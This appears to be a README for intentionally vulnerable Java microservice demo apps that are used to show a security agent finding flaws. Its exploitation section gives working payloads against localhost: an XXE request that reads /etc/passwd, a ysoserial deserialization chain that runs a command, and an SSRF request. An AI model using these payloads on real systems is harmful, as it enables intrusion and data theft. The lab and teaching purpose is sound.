# java-sample-apps
This repo holds a few Java apps showing the agent's ability to discover the most common vulnerabilities in microservices.

There are 3 microservice apps that implement a "book store".

## The Microservices

### bookstore-frontend

The bookstore-frontend app is a jax-rs app serving as a front end for the book store, exposing these
endpoints for book management:
 - GET /health
 - POST /add (this endpoint has an XXE vulnerability)
 - POST /delete
 - GET /list
 - GET /debug

### bookstore-data-manager

The bookstore-data-manager app is a SpringBoot app which holds the book data, offering a few services:
 - GET /ping
 - POST /add
 - POST /update (this "internal only" endpoint has a deserialization vulnerability)
 - POST /delete
 - GET /list
 
### bookstore-debug

The bookstore-debug app is a Dropwizard app that offers info to the devs:
 - GET /application/ping
 - GET /application/info?env=qa (this endpoint has an SSRF vulnerability)

## Usage

The first step is to start all 3 of the services, which will run on ports 8000, 8001 and 8002, respectively.

Each service has a Dockerfile to make running 1 step. Consult each service's `README.md` to see the commands.

### Using the services

You're _supposed_ to do everything through the frontend service.

Get a health check on the entire bookstore service mesh:
```
$ curl http://localhost:8000/health
```

List all the books:
```
$ curl http://localhost:8000/list
```

Add a book:
```
$ curl -H "Content-Type: application/xml" http://localhost:8000/add -d '<book><title>The Giving Tree</title><pages>30</pages></book>'
```

Alternatively, you can add a book through the backend service directly, where it expects JSON:
```
$ curl -H "Content-Type: application/json" http://localhost:8001/add -d '{"pages":"30", "title":"The Giving Tree"}'
```

Get debug info on the service:
```
$ curl http://localhost:8000/debug
```

## Detecting the vulnerabilities
To add the Java Agent to all the services above:

## Exploiting the Vulnerabilities

### XML External Entity (XXE)
The XXE vulnerability can be exploited directly in the bookstore-frontend by adding a new malicious
book:
```
$ curl -H "Content-Type: application/xml" http://localhost:8000/add -d '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "/etc/passwd">]><book><title>foo &xxe;</title><pages>21</pages></book>'
```

Now the contents of `/etc/passwd` has leaked into the the new book title, which you can see by
checking the book titles:
```
$ curl http://localhost:8000/list
```

### Deserialization
The `bookstore-data-manager` offers an "update a book" service that is not supposed to be used from
the outside, which is why it's not available through the `bookstore-frontend`.

This service is available at `/update`, and it accepts a binary, serialized Java object with `Book`
type.

To exploit this, we must first make an exploit that creates a file in `/tmp` as a proof-of-concept:
```
$ git clone https://github.com/frohoff/ysoserial
$ cd ysoserial
$ docker build -t ysoserial .
$ docker run --rm ysoserial CommonsCollections5 '/usr/bin/touch /tmp/hacked' > commonscollections5.ser
```

Now you can send the exploit generated in the `commonscollections5.ser` file:
```
$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@commonscollections5.ser" http://localhost:8001/update
```

To prove that we created this `/tmp/hacked` file, we must shell into the running container. 

If you started with docker-compose, the container ID is something like java-microservice-sample-apps_bookstore-datamanager_1.

If you ran the containers manually, you can start with the ID:
```
$ docker ps
CONTAINER ID        IMAGE                    COMMAND                 CREATED              STATUS              PORTS                              NAMES
*[RUNNING_CONTAINER_ID]*        bookstore-data-manager   "mvn spring-boot:run"
```

Now, using that container ID, we shell into the container and confirm the exploit created the `/tmp/hacked` file:
```
$ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /tmp/hacked
...
-rw-r--r-- 1 root root 0 <time> /tmp/hacked
```

### Server Side Request Forgery (SSRF)
The `bookstore-frontend` exposes a "info" service, only intended for developers. It is intended to be used to rertieve data about different developer environments, but it can be used to force the app to retrieve data from other URLs:
```
$ curl http://localhost:8002/application/info?env=google.com/?
```

Obviously in this case we ask the server to retrieve Google content, but it could as easily be pointed towards URLs typically only accessed within your perimeter.
